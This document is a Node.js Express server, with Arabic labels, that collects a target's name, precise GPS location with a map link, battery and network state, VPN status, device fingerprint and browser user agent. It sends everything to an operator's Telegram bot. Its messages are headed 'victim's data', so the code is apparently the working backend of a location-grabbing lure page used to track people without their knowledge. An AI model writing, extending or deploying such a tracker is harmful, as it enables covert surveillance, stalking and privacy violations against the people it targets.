import express from 'express';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static('.'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post('/api/send-all-data', async (req, res) => {
  const { 
    username, 
    battery, 
    batteryCharging,
    batteryTime,
    network, 
    location, 
    vpn,
    device
  } = req.body;
  
  if (!username) {
    return res.status(400).json({ error: 'missing username' });
  }

  try {
    let message = `📱 بيانات الضحية:\n\n`;
    message += `👤 الاسم: ${username}\n`;
    
    // معلومات البطارية
    if (battery !== undefined && battery !== null) {
      message += `🔋 البطارية: ${battery}%\n`;
      if (batteryCharging !== undefined) {
        message += `⚡ الشحن: ${batteryCharging ? '✅ يشحن' : '❌ لا يشحن'}\n`;
      }
      if (batteryTime && batteryTime !== Infinity) {
        const hours = Math.floor(batteryTime / 3600);
        const minutes = Math.floor((batteryTime % 3600) / 60);
        message += `⏱️ وقت الشحن المتبقي: ${hours} ساعة ${minutes} دقيقة\n`;
      }
    }
    
    // معلومات الشبكة
    if (network) {
      if (network.type) {
        message += `📶 نوع الاتصال: ${network.type}\n`;
      }
      if (network.speed) {
        message += `⚡ السرعة: ${network.speed}\n`;
      }
      if (network.signal) {
        message += `📊 الإشارة: ${network.signal}\n`;
      }
      if (network.networkType) {
        message += `🌐 الشبكة: ${network.networkType}\n`;
      }
      if (network.rtt && network.rtt !== 'غير معروف') {
        message += `⏱️ وقت الاستجابة: ${network.rtt}ms\n`;
      }
    }
    
    // معلومات VPN
    if (vpn !== undefined) {
      message += `🔒 VPN: ${vpn ? '✅ مفعل' : '❌ غير مفعل'}\n`;
    }
    
    // معلومات الموقع
    if (location) {
      message += `📍 الموقع:\n`;
      if (location.latitude) {
        message += `   خط العرض: ${location.latitude}\n`;
      }
      if (location.longitude) {
        message += `   خط الطول: ${location.longitude}\n`;
      }
      if (location.accuracy) {
        message += `   الدقة: ${location.accuracy.toFixed(2)} متر\n`;
      }
      if (location.altitude) {
        message += `   الارتفاع: ${location.altitude.toFixed(2)} متر\n`;
      }
      if (location.speed) {
        message += `   السرعة: ${(location.speed * 3.6).toFixed(2)} كم/س\n`;
      }
      if (location.heading) {
        message += `   الاتجاه: ${location.heading}°\n`;
      }
      if (location.latitude && location.longitude) {
        message += `   🗺️ https://www.google.com/maps?q=${location.latitude},${location.longitude}\n`;
      }
    }
    
    // معلومات الجهاز
    if (device) {
      message += `\n📱 معلومات الجهاز:\n`;
      if (device.platform) {
        message += `   النظام: ${device.platform}\n`;
      }
      if (device.language) {
        message += `   اللغة: ${device.language}\n`;
      }
      if (device.hardwareConcurrency) {
        message += `   عدد الأنوية: ${device.hardwareConcurrency}\n`;
      }
      if (device.deviceMemory && device.deviceMemory !== 'غير معروف') {
        message += `   الذاكرة: ${device.deviceMemory} GB\n`;
      }
      if (device.maxTouchPoints) {
        message += `   نقاط اللمس: ${device.maxTouchPoints}\n`;
      }
      if (device.vendor) {
        message += `   المطور: ${device.vendor}\n`;
      }
      if (device.cookiesEnabled !== undefined) {
        message += `   الكوكيز: ${device.cookiesEnabled ? '✅ مفعلة' : '❌ غير مفعلة'}\n`;
      }
      if (device.doNotTrack) {
        message += `   Do Not Track: ${device.doNotTrack}\n`;
      }
    }
    
    // معلومات المتصفح
    if (device && device.userAgent) {
      message += `\n🌐 المتصفح:\n`;
      message += `   ${device.userAgent}\n`;
    }
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    
    const result = await response.json();
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
